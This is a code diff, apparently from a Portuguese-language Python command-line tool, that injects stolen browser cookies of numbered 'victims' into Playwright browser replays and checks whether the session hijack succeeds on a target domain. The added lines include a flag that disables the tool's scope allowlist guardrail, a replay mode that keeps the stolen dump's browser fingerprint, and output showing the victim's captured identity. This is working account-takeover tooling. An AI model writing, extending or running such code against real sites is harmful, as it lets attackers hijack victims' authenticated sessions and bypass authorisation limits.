@@ -184,8 +184,13 @@ def cookies(db_path: Path, victim: int, domain: str, scheme: str, req_path: str,
 @click.option("--path", "req_path", default="/", show_default=True)
 @click.option("--screenshot", "shot_dir", type=click.Path(path_type=Path), default=None,
               help="Diretorio para salvar screenshot (Playwright)")
+@click.option("--allow-unsafe-scope", is_flag=True,
+              help="Desativa o guardrail de escopo (fail-safe). NAO recomendado.")
+@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
+              default="strict", show_default=True,
+              help="Modo de replay (STRICT preserva fingerprint do dump).")
 def inject(db_path: Path, victim: int, domain: str, url: str, channel: str,
-           req_path: str, shot_dir: Path):
+           req_path: str, shot_dir: Path, allow_unsafe_scope: bool, replay_mode: str):
     """Injeta os cookies da vítima num contexto de requisição e reporta o envio."""
     from .domain.matcher import applicable_cookies
     from .inject.capture import summarize_sent
@@ -197,8 +202,9 @@ def inject(db_path: Path, victim: int, domain: str, url: str, channel: str,
     scheme = "http" if url.startswith("http://") else "https"
     host = domain.split("://")[-1].strip("/")
 
-    if not scope_util.allowed(host):
-        console.print(f"[red]Recusado: '{host}' fora da allowlist (scope.txt).[/]")
+    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
+        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
+                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
         return
 
     cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)
@@ -217,7 +223,7 @@ def inject(db_path: Path, victim: int, domain: str, url: str, channel: str,
         if shot_dir:
             shot_dir.mkdir(parents=True, exist_ok=True)
             shot_path = shot_dir / f"victim_{victim}_{host}.png"
-        result = playwright_client.replay(url, cookies, screenshot_path=shot_path)
+        result = playwright_client.replay(url, cookies, screenshot_path=shot_path, mode=replay_mode)
 
     if result.get("error"):
         console.print(f"[red]Erro no replay: {result['error']}[/]")
@@ -263,8 +269,13 @@ def edit(db_path: Path, victim: int, domain: str, cookie: str, value: str):
 @click.option("--path", "req_path", default="/", show_default=True)
 @click.option("--screenshot", "shot_dir", type=click.Path(path_type=Path), default=None,
               help="Salva screenshots de baseline/injetado")
+@click.option("--allow-unsafe-scope", is_flag=True,
+              help="Desativa o guardrail de escopo (fail-safe). NAO recomendado.")
+@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
+              default="strict", show_default=True,
+              help="Modo de replay (STRICT preserva fingerprint do dump).")
 def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
-          req_path: str, shot_dir: Path):
+          req_path: str, shot_dir: Path, allow_unsafe_scope: bool, replay_mode: str):
     """[M3] Valida se o session hijack teve sucesso no domínio alvo."""
     from .domain.matcher import applicable_cookies
     from .validate.auth_state import detect
@@ -278,8 +289,9 @@ def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
     target_url = url or f"https://{host}{req_path}"
     scheme = "http" if target_url.startswith("http://") else "https"
 
-    if not scope_util.allowed(host):
-        console.print(f"[red]Recusado: '{host}' fora da allowlist (scope.txt).[/]")
+    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
+        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
+                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
         return
 
     raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
@@ -301,13 +313,17 @@ def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
             res.setdefault("error", None)
             return res
         return playwright_client.replay(
-            target_url, with_cookies, screenshot_path=shot_path
+            target_url, with_cookies, screenshot_path=shot_path, mode=replay_mode
         )
 
     # Baseline (sem cookies).
     baseline = replay("baseline", [])
+    if not _verify_effective_urls(baseline, scope_util, allow_unsafe_scope):
+        return
     # Injetado (com cookies).
     injected = replay("injected", cookies)
+    if not _verify_effective_urls(injected, scope_util, allow_unsafe_scope):
+        return
 
     result = detect(baseline, injected, host)
     sent_names = sent_cookie_names(injected)
@@ -327,15 +343,43 @@ def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
     _print_check_result(result, sent_names, artifacts, injected)
 
 
+
+def _verify_effective_urls(result: dict, scope_util, unsafe: bool) -> bool:
+    """Retorna True se todos os hosts efetivamente acessados estao na allowlist."""
+    urls = [result.get("final_url")] if result.get("final_url") else []
+    urls += [r.get("url") for r in result.get("redirect_chain", []) if r.get("url")]
+    for u in urls:
+        if not u:
+            continue
+        host = u.split("://")[-1].split("/")[0].split(":")[0]
+        if not scope_util.allowed(host, unsafe=unsafe):
+            console.print(f"[red]Recusado: redirect para fora da allowlist: {host}[/]")
+            return False
+    return True
+
+
+def _tri_label(value):
+    return {1: "yes", 0: "no", -1: "?"}.get(value,)
+
+
 def _print_check_result(result, sent_names, artifacts, injected):
     state = result["state"]
-    color = {"SESSION_VALID": "green", "SESSION_INVALID": "red", "UNKNOWN": "yellow"}.get(state, "yellow")
-    console.print(f"\n[bold {color}]{state}[/] (confiança {result['confidence']:.2f}, perfil {result['profile']})")
+    color = {"CONFIRMED": "green", "LIKELY": "cyan", "ANONYMOUS": "red",
+             "UNKNOWN": "yellow"}.get(state, "yellow")
+    console.print(f"\n[bold {color}]{state}[/] (confianca {result['confidence']:.2f}, perfil {result['profile']})")
 
     ev = result["evidence"]
-    console.print(f"  baseline status={ev['baseline_status']} | injetado status={ev['injected_status']}")
-    if ev["injected_markers"]:
+    console.print(f"  baseline status={ev.get('status_baseline')} | injetado status={ev.get('status_injected')}")
+    if ev.get("injected_markers"):
         console.print(f"  markers injetado: {', '.join(ev['injected_markers'])}")
+    identity = ev.get("identity_injected") or {}
+    if identity:
+        ids = ", ".join(f"{k}={v}" for k, v in identity.items())
+        console.print(f"  [bold]identidade[/]: {ids}")
+    chain = ev.get("redirect_chain") or []
+    if chain:
+        chain_s = " -> ".join(f"{c['status']} {c['url']}" for c in chain[:5])
+        console.print(f"  redirects: {chain_s}")
     if injected.get("error"):
         console.print(f"  [red]erro replay: {injected['error']}[/]")
 
@@ -346,12 +390,14 @@ def _print_check_result(result, sent_names, artifacts, injected):
         table.add_column("Enviado", justify="center")
         table.add_column("HttpOnly", justify="center")
         table.add_column("Secure", justify="center")
+        table.add_column("SameSite")
         table.add_column("Score", justify="right")
         for a in artifacts:
             table.add_row(a["name"], a["kind"],
                           "yes" if a["sent"] else "-",
-                          "yes" if a["http_only"] else "-",
-                          "yes" if a["secure"] else "-",
+                          _tri_label(a.get("http_only_state")),
+                          _tri_label(a.get("secure_state")),
+                          str(a.get("same_site") or "-"),
                           str(a["score"]))
         console.print(table)
     console.print(f"[dim]Cookies enviados: {len(sent_names)}[/]")
@@ -400,7 +446,8 @@ def check_batch(db_path: Path, domain: str, limit: int, channel: str):
         console.print(f"\n[bright_black]--- vítima {vid} ---[/]")
         ctx = click.Context(check)
         ctx.invoke(check, db_path=db_path, victim=vid, domain=domain,
-                   url=None, channel=channel, req_path="/", shot_dir=None)
+                   url=None, channel=channel, req_path="/", shot_dir=None,
+                   allow_unsafe_scope=False, replay_mode="strict")
         # Recupera o ultimo run desta vítima/domain para sumarizar.
         run = store.list_runs()
         row = next((r for r in run if r["victim_id"] == vid
